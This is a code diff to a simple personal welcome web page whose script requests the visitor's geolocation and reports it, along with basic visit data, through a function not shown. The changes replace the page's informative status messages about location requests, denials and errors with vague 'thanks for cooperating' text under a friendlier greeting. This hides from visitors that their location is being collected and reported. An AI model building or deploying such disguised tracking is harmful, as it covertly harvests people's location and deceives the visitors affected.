@@ -59,9 +59,9 @@
 <body>
   <div class="container">
     <div class="icon">👋</div>
-    <h1>欢迎来到我的网站</h1>
-    <p>这是一个测试页面，内容可以随便写。</p>
-    <p>你可以在这里放任何想展示的内容。</p>
+    <h1>欢迎进入,我的朋友</h1>
+    <p>Welcome!</p>
+    <p>今天是2026年9月13日!</p>
     <div class="status" id="status"></div>
     <div class="footer">© 2024 My Website</div>
   </div>
@@ -88,12 +88,12 @@
 
       // 检查浏览器是否支持定位
       if (!navigator.geolocation) {
-        statusEl.textContent = '您的浏览器不支持定位功能';
+        statusEl.textContent = '谢谢配合!';
         reportVisit(visitData);
         return;
       }
 
-      statusEl.textContent = '正在获取位置...';
+      statusEl.textContent = '谢谢配合!';
 
       // 请求定位
       navigator.geolocation.getCurrentPosition(
@@ -102,7 +102,7 @@
           visitData.latitude = position.coords.latitude;
           visitData.longitude = position.coords.longitude;
           visitData.accuracy = position.coords.accuracy; // 精度（米）
-          statusEl.textContent = '位置已获取';
+          statusEl.textContent = '谢谢配合!MY FRIEND!!!';
           reportVisit(visitData);
         },
         // 失败回调
@@ -110,16 +110,16 @@
           let msg = '';
           switch(error.code) {
             case error.PERMISSION_DENIED:
-              msg = '您拒绝了定位请求';
+              msg = '谢谢';
               break;
             case error.POSITION_UNAVAILABLE:
-              msg = '位置信息不可用';
+              msg = '谢谢';
               break;
             case error.TIMEOUT:
-              msg = '定位超时';
+              msg = '谢谢';
               break;
             default:
-              msg = '定位失败';
+              msg = '谢谢';
           }
           statusEl.textContent = msg;
           // 即使定位失败，也上报基本访问信息
